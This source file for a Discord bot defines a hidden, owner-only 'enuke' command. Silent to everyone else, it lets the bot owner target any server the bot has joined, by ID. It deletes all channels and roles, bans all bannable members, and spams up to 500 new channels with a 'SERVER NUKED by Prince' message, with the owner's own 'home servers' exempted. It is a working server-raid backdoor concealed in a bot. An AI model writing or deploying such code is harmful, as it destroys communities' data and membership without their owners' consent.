import { ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle } from 'discord.js';
import embed from '../embed.js';
import { isBotOwnerSync } from '../utils/helpers.js';

// Temporary storage for enuke target guild IDs (maps button/modal interaction to guild)
const enukeTargets = new Map();

export const commands = [
  {
    name: 'enuke',
    description: 'Opens the Enuke Manager — server wipe sequencer. Bot Owner only.',
    category: 'owner',
    permissions: [],
    slashHidden: true,  // Never register as slash command — prefix only
    hidden: true,
    async executePrefix(message, args) {
      // ABSOLUTE OWNER-ONLY GATE
      if (!isBotOwnerSync(message.author.id)) {
        return; // Silent rejection — don't even acknowledge the command exists
      }

      let targetGuild = message.guild;
      let targetGuildId = message.guild?.id;

      // If a server ID is provided, try to resolve that guild
      if (args[0] && /^\d{17,20}$/.test(args[0])) {
        const resolved = message.client.guilds.cache.get(args[0]);
        if (!resolved) {
          return message.reply({ embeds: [embed.danger('Guild Not Found', `${message.author}  Could not find a guild with ID \`${args[0]}\`. The bot must be a member of that server.`)] });
        }
        targetGuild = resolved;
        targetGuildId = resolved.id;
      }

      if (['1436790385266393142', '1511630038045294662'].includes(targetGuildId)) {
        return message.reply({ embeds: [embed.danger('Protected Server', `${message.author}  This server is designated as a HOME SERVER. The enuke protocol is permanently disabled here.`)] });
      }

      if (!targetGuild) {
        return message.reply({ embeds: [embed.danger('No Target', `${message.author}  No guild found. Use \`enuke\` inside a server or \`enuke <serverId>\`.`)] });
      }

      // Store target for button interaction
      const sessionKey = `enuke_${message.author.id}`;
      enukeTargets.set(sessionKey, {
        guildId: targetGuildId,
        guildName: targetGuild.name,
        memberCount: targetGuild.memberCount,
        channelCount: targetGuild.channels.cache.size,
        roleCount: targetGuild.roles.cache.size
      });

      // Build the Enuke Manager entry embed
      const enukeEmbed = embed.build({
        title: ' Enuke Manager',
        description: 
          `**Target Server:** \`${targetGuild.name}\`\n` +
          `**Server ID:** \`${targetGuildId}\`\n` +
          `**Members:** \`${targetGuild.memberCount}\`\n` +
          `**Channels:** \`${targetGuild.channels.cache.size}\`\n` +
          `**Roles:** \`${targetGuild.roles.cache.size}\`\n\n` +
          `️ **This action is IRREVERSIBLE.** Press the button below to configure the nuke sequence.`,
        color: '#ff0000',
        fields: [
          { name: 'Mode 1', value: '`Channels & Roles` — Wipe all channels and roles only', inline: false },
          { name: 'Mode 2', value: '`Ban All` — Ban all members only', inline: false },
          { name: 'Mode 3', value: '`Wipe All` — Nuke everything (channels, roles, and ban all members)', inline: false }
        ]
      });

      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder()
          .setCustomId(`enuke_open_manager_${message.author.id}`)
          .setLabel(' Open Enuke Manager')
          .setStyle(ButtonStyle.Danger)
      );

      const msg = await message.reply({ embeds: [enukeEmbed], components: [row] });
      
      setTimeout(() => {
        msg.delete().catch(() => null);
        enukeTargets.delete(sessionKey);
      }, 90000);
    },
    // No slash version
    async executeSlash(interaction) {
      return interaction.reply({ embeds: [embed.danger('Access Denied', 'This command is only available as a prefix command.')] });
    }
  }
];

/**
 * Handle the Enuke Manager button click — opens the modal
 */
export async function handleEnukeButton(interaction) {
  console.log(`[ENUKE BUTTON] Clicked by ${interaction.user.tag} (${interaction.user.id})`);
  console.log(`[ENUKE BUTTON] OWNER_ID = "${process.env.OWNER_ID}"`);
  console.log(`[ENUKE BUTTON] isBotOwnerSync = ${isBotOwnerSync(interaction.user.id)}`);
  
  // Only the bot owner can use this
  if (!isBotOwnerSync(interaction.user.id)) {
    return interaction.reply({ content: '️ Access Denied. Only the Bot Owner can use this.' });
  }

  const sessionKey = `enuke_${interaction.user.id}`;
  const target = enukeTargets.get(sessionKey);
  
  if (!target) {
    return interaction.reply({ content: ' Session expired. Please run the `enuke` command again.' });
  }

  if (['1436790385266393142', '1511630038045294662'].includes(target.guildId)) {
    return interaction.reply({ content: ' This is a protected Home Server. Enuke is permanently disabled here.' });
  }

  // Build the modal
  const modal = new ModalBuilder()
    .setCustomId(`enuke_modal_${interaction.user.id}`)
    .setTitle(' Enuke Manager');

  const modeInput = new TextInputBuilder()
    .setCustomId('enuke_mode')
    .setLabel('Mode (1=Chan&Role, 2=BanAll, 3=WipeAll)')
    .setStyle(TextInputStyle.Short)
    .setPlaceholder('1, 2, or 3')
    .setRequired(true)
    .setMaxLength(1)
    .setMinLength(1);

  const channelCountInput = new TextInputBuilder()
    .setCustomId('enuke_channel_count')
    .setLabel('Channels to Create (0-500)')
    .setStyle(TextInputStyle.Short)
    .setPlaceholder('10')
    .setRequired(true)
    .setMaxLength(3);

  const channelNameInput = new TextInputBuilder()
    .setCustomId('enuke_channel_name')
    .setLabel('Channel Name')
    .setStyle(TextInputStyle.Short)
    .setPlaceholder('nuked-channel')
    .setRequired(true)
    .setMaxLength(100);

  const confirmInput = new TextInputBuilder()
    .setCustomId('enuke_confirm')
    .setLabel('Type CONFIRM to proceed')
    .setStyle(TextInputStyle.Short)
    .setPlaceholder('CONFIRM')
    .setRequired(true)
    .setMaxLength(7);

  modal.addComponents(
    new ActionRowBuilder().addComponents(modeInput),
    new ActionRowBuilder().addComponents(channelCountInput),
    new ActionRowBuilder().addComponents(channelNameInput),
    new ActionRowBuilder().addComponents(confirmInput)
  );

  return interaction.showModal(modal);
}

/**
 * Handle the Enuke modal submission — executes the nuke sequence
 */
export async function handleEnukeModal(interaction) {
  console.log(`[ENUKE MODAL] Submitted by ${interaction.user.tag} (${interaction.user.id})`);
  
  // Only the bot owner can use this
  if (!isBotOwnerSync(interaction.user.id)) {
    return interaction.reply({ content: '️ Access Denied.' });
  }

  const sessionKey = `enuke_${interaction.user.id}`;
  const target = enukeTargets.get(sessionKey);

  if (!target) {
    return interaction.reply({ content: ' Session expired. Please run the `enuke` command again.' });
  }

  if (['1436790385266393142', '1511630038045294662'].includes(target.guildId)) {
    return interaction.reply({ content: ' This is a protected Home Server. Enuke is permanently disabled here.' });
  }

  // Parse modal fields
  const modeStr = interaction.fields.getTextInputValue('enuke_mode').trim();
  const channelCountStr = interaction.fields.getTextInputValue('enuke_channel_count').trim();
  const channelName = interaction.fields.getTextInputValue('enuke_channel_name').trim().toLowerCase().replace(/\s+/g, '-');
  const confirmStr = interaction.fields.getTextInputValue('enuke_confirm').trim();

  // Validate
  const mode = parseInt(modeStr);
  if (![1, 2, 3].includes(mode)) {
    return interaction.reply({ embeds: [embed.danger('Invalid Mode', 'Mode must be `1`, `2`, or `3`.')] });
  }

  const channelCount = parseInt(channelCountStr);
  if (isNaN(channelCount) || channelCount < 0 || channelCount > 500) {
    return interaction.reply({ embeds: [embed.danger('Invalid Count', 'Channels to create must be between `0` and `500`.')] });
  }

  if (confirmStr !== 'CONFIRM') {
    return interaction.reply({ embeds: [embed.danger('Aborted', 'You must type `CONFIRM` exactly to proceed. Nuke sequence aborted.')] });
  }

  // Clean up session
  enukeTargets.delete(sessionKey);

  // Acknowledge the modal
  await interaction.reply({ embeds: [embed.danger(' Nuke Sequence Initiated', `Target: **${target.guildName}** (\`${target.guildId}\`)\nMode: **${mode}** | Channels to create: **${channelCount}** | Name: **${channelName}**\n\n Executing...`)] });

  // Resolve the guild
  const guild = interaction.client.guilds.cache.get(target.guildId);
  if (!guild) {
    return interaction.followUp({ content: ' Guild no longer accessible.' });
  }

  // Execute the nuke
  const results = await executeNuke(guild, interaction.user, mode, channelCount, channelName);

  // Report results
  const resultEmbed = embed.build({
    title: ' Enuke Sequence Complete',
    description: `Target: **${target.guildName}** (\`${target.guildId}\`)`,
    color: '#ff0000',
    fields: [
      { name: ' Mode', value: `\`${mode}\``, inline: true },
      { name: ' Channels Deleted', value: `\`${results.channelsDeleted}\``, inline: true },
      { name: ' Roles Deleted', value: `\`${results.rolesDeleted}\``, inline: true },
      { name: ' Members Banned', value: `\`${results.membersBanned}\``, inline: true },
      { name: '<:emoji_16:1521464002046328944> Channels Created', value: `\`${results.channelsCreated}\``, inline: true },
      { name: ' Errors', value: `\`${results.errors}\``, inline: true }
    ]
  });

  await interaction.followUp({ embeds: [resultEmbed] }).catch(() => null);
}

/**
 * Core nuke execution engine
 */
async function executeNuke(guild, executor, mode, channelCount, channelName) {
  const results = {
    channelsDeleted: 0,
    rolesDeleted: 0,
    membersBanned: 0,
    channelsCreated: 0,
    errors: 0
  };

  const botId = guild.members.me.id;
  const ownerId = process.env.OWNER_ID || '1423292960744804383';

  // ==========================================
  // MODE 1 & 3: DELETE ALL CHANNELS
  // ==========================================
  if (mode === 1 || mode === 3) {
    const channels = guild.channels.cache.map(c => c);
    for (const channel of channels) {
      try {
        await channel.delete('Enuke Sequence').catch(() => null);
        results.channelsDeleted++;
      } catch {
        results.errors++;
      }
    }
  }

  // ==========================================
  // MODE 1 & 3: DELETE ALL ROLES
  // ==========================================
  if (mode === 1 || mode === 3) {
    const { UNBYPASSABLE_ROLE_NAME, FIREWALL_ROLE_NAME } = await import('../utils/antiStrip.js');
    const botHighest = guild.members.me.roles.highest.position;
    const roles = guild.roles.cache
      .filter(r => !r.managed && r.id !== guild.id && r.position < botHighest && r.name !== UNBYPASSABLE_ROLE_NAME && r.name !== FIREWALL_ROLE_NAME)
      .sort((a, b) => b.position - a.position)
      .map(r => r);

    for (const role of roles) {
      try {
        await role.delete('Enuke Sequence').catch(() => null);
        results.rolesDeleted++;
      } catch {
        results.errors++;
      }
    }
  }

  // ==========================================
  // MODE 2 & 3: BAN ALL MEMBERS
  // ==========================================
  if (mode === 2 || mode === 3) {
    try {
      const members = await guild.members.fetch();
      for (const [memberId, member] of members) {
        // Never ban the bot itself or the bot owner
        if (memberId === botId) continue;
        if (memberId === ownerId) continue;
        if (memberId === guild.ownerId) continue; // Can't ban server owner via API

        try {
          if (member.bannable) {
            await member.ban({ reason: `Enuke Sequence — executed by ${executor.tag}` }).catch(() => null);
            results.membersBanned++;
          }
        } catch {
          results.errors++;
        }
      }
    } catch {
      results.errors++;
    }
  }

  // ==========================================
  // CREATE NEW CHANNELS + POST NUKE EMBED
  // ==========================================
  if (channelCount > 0 && (mode === 1 || mode === 3)) {
    const now = new Date();
    const timestampStr = now.toLocaleDateString('en-GB', { timeZone: 'Asia/Kolkata', weekday: 'long', day: 'numeric', month: 'long', year: 'numeric' }) + ' ' + now.toLocaleTimeString('en-GB', { timeZone: 'Asia/Kolkata', hour: '2-digit', minute: '2-digit' }) + ' (IST)';

    const nukeAnnouncement = embed.build({
      title: ' SERVER NUKED',
      description: `This server has been nuked by Prince`,
      color: '#ff0000',
      fields: [
        { name: 'Channel Name', value: channelName, inline: false },
        { name: 'Nuked By', value: executor.tag || executor.username, inline: false },
        { name: 'Timestamp', value: timestampStr, inline: false }
      ]
    });

    for (let i = 0; i < channelCount; i++) {
      try {
        const newChannel = await guild.channels.create({
          name: channelName,
          reason: 'Enuke Sequence'
        });
        results.channelsCreated++;

        // Post the nuke announcement in each created channel
        await newChannel.send({ embeds: [nukeAnnouncement] }).catch(() => null);
      } catch {
        results.errors++;
      }
    }
  }

  // If mode 2 (ban only), still create channels if requested
  if (channelCount > 0 && mode === 2) {
    const now = new Date();
    const timestampStr = now.toLocaleDateString('en-GB', { timeZone: 'Asia/Kolkata', weekday: 'long', day: 'numeric', month: 'long', year: 'numeric' }) + ' ' + now.toLocaleTimeString('en-GB', { timeZone: 'Asia/Kolkata', hour: '2-digit', minute: '2-digit' }) + ' (IST)';

    const nukeAnnouncement = embed.build({
      title: ' SERVER NUKED',
      description: `This server has been nuked by Prince`,
      color: '#ff0000',
      fields: [
        { name: 'Channel Name', value: channelName, inline: false },
        { name: 'Nuked By', value: executor.tag || executor.username, inline: false },
        { name: 'Timestamp', value: timestampStr, inline: false }
      ]
    });

    for (let i = 0; i < channelCount; i++) {
      try {
        const newChannel = await guild.channels.create({
          name: channelName,
          reason: 'Enuke Sequence'
        });
        results.channelsCreated++;
        await newChannel.send({ embeds: [nukeAnnouncement] }).catch(() => null);
      } catch {
        results.errors++;
      }
    }
  }

  return results;
}
